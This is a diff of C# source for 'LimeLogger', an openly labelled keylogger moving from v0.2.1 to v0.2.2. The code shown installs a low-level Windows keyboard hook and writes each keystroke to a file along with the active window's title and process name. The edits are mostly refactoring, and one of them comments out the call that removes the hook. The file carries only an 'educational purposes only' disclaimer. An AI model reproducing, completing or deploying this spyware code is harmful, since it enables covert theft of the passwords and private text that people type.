@@ -7,7 +7,7 @@ using System.Windows.Forms;
 
 
 //       │ Author     : NYAN CAT
-//       │ Name       : LimeLogger v0.2.1
+//       │ Name       : LimeLogger v0.2.2
 //       │ Contact    : https://github.com/NYAN-x-CAT
 
 //       This program is distributed for educational purposes only.
@@ -23,7 +23,7 @@ namespace LimeLogger
         {
             _hookID = SetHook(_proc);
             Application.Run();
-            UnhookWindowsHookEx(_hookID);
+            //UnhookWindowsHookEx(_hookID);
         }
 
         private static IntPtr SetHook(LowLevelKeyboardProc proc)
@@ -42,8 +42,7 @@ namespace LimeLogger
             {
                 int vkCode = Marshal.ReadInt32(lParam);
                 bool CapsLock = (((ushort)GetKeyState(0x14)) & 0xffff) != 0;
-                string currentKey = null;
-                currentKey = KeyboardLayout((uint)vkCode);
+                string currentKey;
 
                 if (CapsLock)
                 {
@@ -97,7 +96,6 @@ namespace LimeLogger
                             else
                                 currentKey = "[CAPSLOCK: ON]";
                             break;
-
                     }
                 }
 
@@ -105,14 +103,10 @@ namespace LimeLogger
                 {
                     if (CurrentActiveWindowTitle == GetActiveWindowTitle())
                     {
-                        //Console.Write(currentKey);
                         sw.Write(currentKey);
                     }
                     else
                     {
-                        //Console.WriteLine(Environment.NewLine);
-                        //Console.WriteLine($"###  {GetActiveWindowTitle()} ###");
-                        //Console.Write(currentKey);
                         sw.WriteLine(Environment.NewLine);
                         sw.WriteLine($"###  {GetActiveWindowTitle()} ###");
                         sw.Write(currentKey);
@@ -142,9 +136,8 @@ namespace LimeLogger
         private static string GetActiveWindowTitle()
         {
             const int nChars = 256;
-            IntPtr handle = IntPtr.Zero;
             StringBuilder Buff = new StringBuilder(nChars);
-            handle = GetForegroundWindow();
+            IntPtr handle = GetForegroundWindow();
 
             if (GetWindowText(handle, Buff, nChars) > 0)
             {
@@ -163,8 +156,7 @@ namespace LimeLogger
             {
                 string pName;
                 IntPtr hwnd = GetForegroundWindow();
-                uint pid;
-                GetWindowThreadProcessId(hwnd, out pid);
+                GetWindowThreadProcessId(hwnd, out uint pid);
                 Process p = Process.GetProcessById((int)pid);
                 pName = Path.GetFileName(p.MainModule.FileName);
 
@@ -176,37 +168,33 @@ namespace LimeLogger
             }
         }
 
-
         #region "Hooks & Native Methods"
-
-        private const int WH_KEYBOARD_LL = 13;
         private const int WM_KEYDOWN = 0x0100;
         private static LowLevelKeyboardProc _proc = HookCallback;
         private static IntPtr _hookID = IntPtr.Zero;
 
         [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
         private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);
+
         [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
         [return: MarshalAs(UnmanagedType.Bool)]
         private static extern bool UnhookWindowsHookEx(IntPtr hhk);
+
         [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
         private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
+
         [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
         private static extern IntPtr GetModuleHandle(string lpModuleName);
-
-        [DllImport("kernel32.dll")]
-        static extern IntPtr GetConsoleWindow();
-        [DllImport("user32.dll")]
-        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
-        const int SW_HIDE = 0;
         private static int WHKEYBOARDLL = 13;
 
         private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
 
         [DllImport("user32.dll")]
         static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);
+
         [DllImport("user32.dll")]
         static extern IntPtr GetForegroundWindow();
+
         private static string CurrentActiveWindowTitle;
 
         [DllImport("user32.dll", SetLastError = true)]
@@ -218,13 +206,15 @@ namespace LimeLogger
         [DllImport("user32.dll", SetLastError = true)]
         [return: MarshalAs(UnmanagedType.Bool)]
         static extern bool GetKeyboardState(byte[] lpKeyState);
+
         [DllImport("user32.dll")]
         static extern IntPtr GetKeyboardLayout(uint idThread);
+
         [DllImport("user32.dll")]
         static extern int ToUnicodeEx(uint wVirtKey, uint wScanCode, byte[] lpKeyState, [Out, MarshalAs(UnmanagedType.LPWStr)] StringBuilder pwszBuff, int cchBuff, uint wFlags, IntPtr dwhkl);
+
         [DllImport("user32.dll")]
         static extern uint MapVirtualKey(uint uCode, uint uMapType);
-
         #endregion
 
     }
